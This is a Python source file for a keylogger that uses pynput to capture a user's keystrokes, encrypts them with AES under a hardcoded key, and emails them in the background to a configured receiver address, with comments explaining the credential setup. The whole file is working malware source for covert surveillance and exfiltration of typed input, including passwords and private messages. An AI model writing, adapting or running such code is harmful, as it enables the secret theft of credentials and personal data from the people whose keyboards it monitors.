from pynput import keyboard
from aes import AES
import send_email
import threading
# You need to create a file to store the receiver and sender email address.
# You also need the app password of both the receiver and sender email address.
# The email server is "imap.gmail.com"
from authentications import receiver_email, sender_email, app_password_sender, email_server

# Default port for Secure Mail Transfer Protocol Secure
PORT = 465


class KeyLogger:
    def __init__(self):
        # The key and iv is the password to the encrypted message when transmitting through email.
        self.key = b'\xc8\x88\xc6\xbe\xde\x85\xbc\x1f\xeb\xa4\xc2\xa4\x04\x0f\x9b\xd5'
        self.iv = b'\x98>\xf8\xac9\x890I\xfa\xd2>p\r\xfa\x91\x83'
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.log_keys = ''

    def send_data(self):
        # Encrypt the logged keys using AES and send via email, this creates new thread.
        # By default the logged keys must be 20 characters before transmitting.
        if len(self.log_keys) > 20:
            encrypted = AES(self.key).encrypt_ctr(
                self.log_keys.encode(), self.iv)
            self.log_keys = ''
            t1 = threading.Thread(target=send_email.send_message, args=(
                PORT, email_server, sender_email, receiver_email, app_password_sender, encrypted))
            t1.start()
        else:
            return

    # on_press callbacks executes everytime the user presses keyboard keys.
    def on_press(self, key):
        self.send_data()

        # The keylogger only logs alphanumeric keys
        try:
            self.log_keys += key.char
        except AttributeError:
            pass

    def start_listener(self):
        self.listener.start()
        self.listener.join()


if __name__ == "__main__":
    key_logger = KeyLogger()
    key_logger.start_listener()
